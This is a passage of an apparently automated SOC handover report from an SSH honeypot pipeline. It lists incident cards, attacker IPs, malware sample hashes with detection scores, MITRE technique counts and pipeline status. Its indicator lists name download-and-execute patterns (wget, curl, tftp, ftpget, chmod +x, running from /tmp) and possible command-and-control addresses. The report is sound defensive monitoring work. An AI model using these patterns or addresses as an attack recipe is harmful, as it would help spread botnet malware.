| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 22:51:24` | `cowrie.session.connect` |
| `2026-07-08 22:51:25` | `cowrie.client.version` |
| `2026-07-08 22:51:25` | `cowrie.client.kex` |
| `2026-07-08 22:51:26` | `cowrie.login.success` |
| `2026-07-08 22:51:26` | `cowrie.direct-tcpip.request` |
| `2026-07-08 22:51:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.2.228[.]48` to AbuseIPDB if not already reported
- [ ] Block `185.2.228[.]48` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4389a51f8fcc

| Field | Detail |
|---|---|
| **Source IP** | `210.0.90[.]82` |
| **First Seen** | 2026-07-08 22:51 |
| **Last Seen** | 2026-07-08 22:51 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 22:51:32` | `cowrie.session.connect` |
| `2026-07-08 22:51:34` | `cowrie.client.version` |
| `2026-07-08 22:51:34` | `cowrie.client.kex` |
| `2026-07-08 22:51:37` | `cowrie.login.success` |
| `2026-07-08 22:51:38` | `cowrie.direct-tcpip.request` |
| `2026-07-08 22:51:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.0.90[.]82` to AbuseIPDB if not already reported
- [ ] Block `210.0.90[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d948e208a991

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-08 22:51 |
| **Last Seen** | 2026-07-08 22:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 22:51:39` | `cowrie.session.connect` |
| `2026-07-08 22:51:39` | `cowrie.client.version` |
| `2026-07-08 22:51:39` | `cowrie.client.kex` |
| `2026-07-08 22:51:39` | `cowrie.login.success` |
| `2026-07-08 22:51:39` | `cowrie.direct-tcpip.request` |
| `2026-07-08 22:51:40` | `cowrie.direct-tcpip.ja4` |
| `2026-07-08 22:51:40` | `cowrie.direct-tcpip.data` |
| `2026-07-08 22:51:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31c265f2bc38

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-08 22:53 |
| **Last Seen** | 2026-07-08 22:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 22:53:15` | `cowrie.session.connect` |
| `2026-07-08 22:53:15` | `cowrie.client.version` |
| `2026-07-08 22:53:15` | `cowrie.client.kex` |
| `2026-07-08 22:53:16` | `cowrie.login.success` |
| `2026-07-08 22:53:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4284f1fdd7f1

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-08 22:53 |
| **Last Seen** | 2026-07-08 22:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 22:53:16` | `cowrie.session.connect` |
| `2026-07-08 22:53:16` | `cowrie.client.version` |
| `2026-07-08 22:53:16` | `cowrie.client.kex` |
| `2026-07-08 22:53:17` | `cowrie.login.success` |
| `2026-07-08 22:53:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fcb36797ed5

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-08 22:54 |
| **Last Seen** | 2026-07-08 22:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 22:54:41` | `cowrie.session.connect` |
| `2026-07-08 22:54:41` | `cowrie.client.version` |
| `2026-07-08 22:54:41` | `cowrie.client.kex` |
| `2026-07-08 22:54:41` | `cowrie.login.success` |
| `2026-07-08 22:54:42` | `cowrie.session.params` |
| `2026-07-08 22:54:42` | `cowrie.command.input` |
| `2026-07-08 22:54:42` | `cowrie.log.closed` |
| `2026-07-08 22:54:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c5a3defd6de

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-08 22:54 |
| **Last Seen** | 2026-07-08 22:54 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 22:54:45` | `cowrie.session.connect` |
| `2026-07-08 22:54:46` | `cowrie.client.version` |
| `2026-07-08 22:54:46` | `cowrie.client.kex` |
| `2026-07-08 22:54:52` | `cowrie.login.success` |
| `2026-07-08 22:54:55` | `cowrie.session.params` |
| `2026-07-08 22:54:55` | `cowrie.command.input` |
| `2026-07-08 22:54:57` | `cowrie.log.closed` |
| `2026-07-08 22:54:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d42dc940f3a7

| Field | Detail |
|---|---|
| **Source IP** | `78.187.9[.]111` |
| **First Seen** | 2026-07-08 22:54 |
| **Last Seen** | 2026-07-08 22:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 22:54:58` | `cowrie.session.connect` |
| `2026-07-08 22:54:58` | `cowrie.client.version` |
| `2026-07-08 22:54:58` | `cowrie.client.kex` |
| `2026-07-08 22:55:00` | `cowrie.login.success` |
| `2026-07-08 22:55:00` | `cowrie.direct-tcpip.request` |

**Recommended Actions:**
- [ ] Submit `78.187.9[.]111` to AbuseIPDB if not already reported
- [ ] Block `78.187.9[.]111` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `179.61.192[.]156` | **52** | 2026-07-08 20:55 | 2026-07-08 22:54 | 53m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **5** | 2026-07-08 21:01 | 2026-07-08 22:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]39` | **3** | 2026-07-08 21:37 | 2026-07-08 21:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `176.53.159[.]38` | **3** | 2026-07-08 21:35 | 2026-07-08 21:36 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `139.19.117[.]129` | **2** | 2026-07-08 21:14 | 2026-07-08 22:14 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `159.65.233[.]253` | **2** | 2026-07-08 21:57 | 2026-07-08 22:54 | 1m | 0 | `T1592` | 🟢 LOW |
| `164.92.115[.]22` | **2** | 2026-07-08 22:14 | 2026-07-08 22:14 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]137` | **2** | 2026-07-08 22:43 | 2026-07-08 22:49 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.106.32[.]128` | **2** | 2026-07-08 22:09 | 2026-07-08 22:09 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.64.105[.]252` | **2** | 2026-07-08 21:09 | 2026-07-08 21:09 | 0m | 0 | `T1592` | 🟢 LOW |
| `47.84.205[.]178` | **2** | 2026-07-08 21:28 | 2026-07-08 21:29 | 0m | 0 | `T1592` | 🟢 LOW |
| `87.236.176[.]152` | **2** | 2026-07-08 20:58 | 2026-07-08 20:58 | 0m | 0 | `T1592` | 🟢 LOW |
| `104.248.143[.]134` | 1 | 2026-07-08 22:15 | 2026-07-08 22:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `112.31.93[.]229` | 1 | 2026-07-08 21:36 | 2026-07-08 21:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.247.82[.]240` | 1 | 2026-07-08 22:27 | 2026-07-08 22:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `118.196.51[.]94` | 1 | 2026-07-08 21:35 | 2026-07-08 21:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `141.11.88[.]137` | 1 | 2026-07-08 21:59 | 2026-07-08 21:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.161.251[.]64` | 1 | 2026-07-08 21:50 | 2026-07-08 21:50 | 5s | 0 | `T1592` | 🟢 LOW |
| `185.40.122[.]250` | 1 | 2026-07-08 22:23 | 2026-07-08 22:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `187.218.57[.]50` | 1 | 2026-07-08 21:57 | 2026-07-08 21:57 | 6s | 0 | `T1592` | 🟢 LOW |
| `2.58.172[.]185` | 1 | 2026-07-08 22:01 | 2026-07-08 22:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `206.81.2[.]201` | 1 | 2026-07-08 22:41 | 2026-07-08 22:41 | 35s | 0 | `T1592` | 🟢 LOW |
| `213.66.196[.]11` | 1 | 2026-07-08 21:54 | 2026-07-08 21:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `218.78.59[.]30` | 1 | 2026-07-08 21:04 | 2026-07-08 21:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]252` | 1 | 2026-07-08 21:36 | 2026-07-08 21:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.101.223[.]226` | 1 | 2026-07-08 22:36 | 2026-07-08 22:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `60.174.35[.]18` | 1 | 2026-07-08 22:27 | 2026-07-08 22:28 | 22s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]88` | 1 | 2026-07-08 21:51 | 2026-07-08 21:51 | 15s | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]55` | 1 | 2026-07-08 22:52 | 2026-07-08 22:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `93.177.157[.]179` | 1 | 2026-07-08 21:57 | 2026-07-08 21:57 | 17s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 57/100 | 🟡 MEDIUM | **18/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/73 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/73** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 67/100 | 🟡 MEDIUM | **18/73** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **32/73** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/73** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **29/73** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 51/100 | 🟡 MEDIUM | **28/73** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/73** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **36/73** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 43/100 | 🟡 MEDIUM | **34/73** 🔴 |
| `5f160094d291b41abe2e65a17c1b1c8a4aec041bf63c72cf01494b2ff37e20c9` | ELF Binary (Linux executable) (ARM 32-bit) | `5f160094d291b41a...` | 61/100 | 🟡 MEDIUM | **29/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/73** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 64/100 | 🟡 MEDIUM | **12/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 61/100 | 🟡 MEDIUM | **27/73** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 86/100 | 🔴 HIGH | **39/73** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `84fac1d9c9d83182fa6428365907f7fbeb4c621eb7eb2b2a0140fdcd245b20e9` | ELF Binary (Linux executable) (x86-64 64-bit) | `84fac1d9c9d83182...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `85338e737e8b8c9ff9742ebc5bb0b73d91d441774161ad936f14910259d985ba` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `85338e737e8b8c9f...` | 60/100 | 🟡 MEDIUM | **26/73** 🔴 |
| `85a17fe8e290a224a717445d0f5e819283567101a92945ea10069946dc7e19d8` | Shell Script | `85a17fe8e290a224...` | 56/100 | 🟡 MEDIUM | **16/74** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **43/74** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `8ee57538c54d91114aaf824330878c6bca5e905f32a7d4ee7517e1efd364e19c` | Unknown binary | `8ee57538c54d9111...` | 56/100 | 🟡 MEDIUM | **40/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `111.70.23[.]240` | TW | CHT-Mobile business Group,Chunghwa | **100** ⚠️ | 50 |
| `117.247.82[.]240` | IN | Broadband Multiplay Project, O/o DGM BB, NOC BSNL Bangalore | **100** ⚠️ | 9 |
| `46.101.223[.]226` | DE | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `47.84.205[.]178` | SG | Alibaba Cloud LLC | **100** ⚠️ | 32 |
| `157.245.34[.]56` | GB | DigitalOcean, LLC | **100** ⚠️ | 1 |
| `200.89.159[.]59` | AR | Telecom Argentina S.A. | **100** ⚠️ | 50 |
| `168.196.132[.]34` | BR | UNIFIQUE TELECOMUNICACOES S/A | **100** ⚠️ | 10 |
| `159.65.233[.]253` | US | DigitalOcean, LLC | **100** ⚠️ | 5 |
| `195.158.26[.]59` | UZ | Uzbektelekom Joint Stock Company | **100** ⚠️ | 50 |
| `210.0.90[.]82` | AU | AAPT Limited | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 136 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 114 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 26 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 25 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 25 |

---

## 🔕 False Positive Summary (14 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 5 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 9 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 225 cases |
| Tool 34  | Credential Extractor        | ✅ 167 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 14 fingerprints |
| Tool 36  | Command Clustering          | ✅ 7 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 85 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 14 filtered (6.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 59 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 37 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 114 priority case(s) shown individually · 30 recon entry/entries in table (12 group(s) consolidating 79 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-08T23:12:31Z_
